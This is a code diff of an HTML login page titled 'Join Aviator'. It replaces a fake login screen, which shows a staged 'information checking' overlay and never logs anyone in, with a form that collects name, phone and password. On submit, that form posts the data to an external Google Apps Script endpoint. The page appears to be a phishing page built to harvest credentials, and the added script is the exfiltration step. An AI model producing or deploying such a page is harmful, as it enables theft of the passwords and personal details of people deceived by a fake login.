@@ -1,136 +1,38 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Login Page</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: Arial, sans-serif;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: #f0f0f0;
-        }
-
-        .login-box {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            text-align: center;
-            width: 300px;
-            z-index: 1;
-        }
-
-        .login-box img {
-            width: 150px;
-            margin-bottom: 20px;
-        }
-
-        .login-box input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-
-        .login-box button {
-            width: 100%;
-            padding: 10px;
-            background-color: #007bff;
-            border: none;
-            color: white;
-            font-size: 16px;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-
-        .login-box button:hover {
-            background-color: #0056b3;
-        }
-
-        .message {
-            margin-top: 15px;
-            font-weight: bold;
-        }
-
-        .loading-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: black;
-            color: white;
-            text-align: center;
-            padding-top: 20%;
-            font-size: 22px;
-            z-index: 999;
-        }
-
-        .loading-overlay h1 {
-            margin-bottom: 20px;
-        }
-
-        .error {
-            color: red;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>Login Form</title>
 </head>
 <body>
+  <h2>Login</h2>
+  <form id="loginForm">
+    <input type="text" name="name" placeholder="Enter Name"><br><br>
+    <input type="text" name="phone" placeholder="Enter Phone"><br><br>
+    <input type="password" name="password" placeholder="Enter Password"><br><br>
+    <button type="submit">Join Aviator</button>
+  </form>
 
-    <!-- Login Box -->
-    <div class="login-box" id="loginBox">
-        <img src="logo.png" alt="Logo">
-        <h2> Login</h2>
-        <input type="text" id="phone" placeholder="Phone number/Ohers">
-        <input type="password" id="password" placeholder="Password">
-        <button onclick="handleLogin()">Join Aviator</button>
-        <div id="message" class="message"></div>
-    </div>
+  <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbwqwF8DTPSsLm9VsnxHJmDJD12WAqtNAvwb8l0AVQk/exec';
+    const form = document.getElementById('loginForm');
 
-    <!-- Fullscreen Loading Overlay -->
-    <div class="loading-overlay" id="loadingScreen">
-        <h1>Login and waiting please</h1>
-        <p>Your information checking</p>
-    </div>
+    form.addEventListener('submit', e => {
+      e.preventDefault();
 
-    <script>
-        let alreadySubmitted = false;
+      const formData = {
+        name: form.name.value,
+        phone: form.phone.value,
+        password: form.password.value
+      };
 
-        function handleLogin() {
-            const phone = document.getElementById("phone").value;
-            const password = document.getElementById("password").value;
-            const messageDiv = document.getElementById("message");
-            const loginBox = document.getElementById("loginBox");
-            const loadingScreen = document.getElementById("loadingScreen");
-
-            if (!alreadySubmitted) {
-                if (phone && password) {
-                    // Hide login box and show fullscreen loading screen
-                    loginBox.style.display = "none";
-                    loadingScreen.style.display = "block";
-                    alreadySubmitted = true;
-
-                    // After 4 minutes (240,000 ms), do something
-                    setTimeout(() => {
-                        loadingScreen.innerHTML = "<h1>Done!</h1><p>You may now close this page.</p>";
-                    }, 120000);
-                } else {
-                    messageDiv.textContent = "Please enter phone and password.";
-                    messageDiv.className = "message error";
-                }
-            } else {
-                messageDiv.textContent = "Error: Already submitted.";
-                messageDiv.className = "message error";
-            }
-        }
-    </script>
-
+      fetch(scriptURL, {
+        method: 'POST',
+        body: JSON.stringify(formData)
+      })
+      .then(response => alert('Data submitted successfully!'))
+      .catch(error => alert('Error!', error.message));
+    });
+  </script>
 </body>
 </html>
